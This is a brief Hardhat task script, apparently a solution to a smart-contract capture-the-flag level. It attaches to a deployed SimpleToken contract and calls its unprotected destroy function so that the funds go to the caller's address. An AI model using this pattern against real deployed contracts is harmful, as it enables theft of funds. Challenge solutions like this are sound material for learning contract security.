// Important
// you have to create the SimpleContract and compile it for line 7 to work

import { task } from "hardhat/config";

task("script:attackRecovery").setAction(async function ({}, { ethers }) {
  const attackFactory: any = <any>await ethers.getContractFactory("SimpleToken");
  const attack = attackFactory.attach("<address_of_contract>");
  await attack.destroy("<you_address>");
});
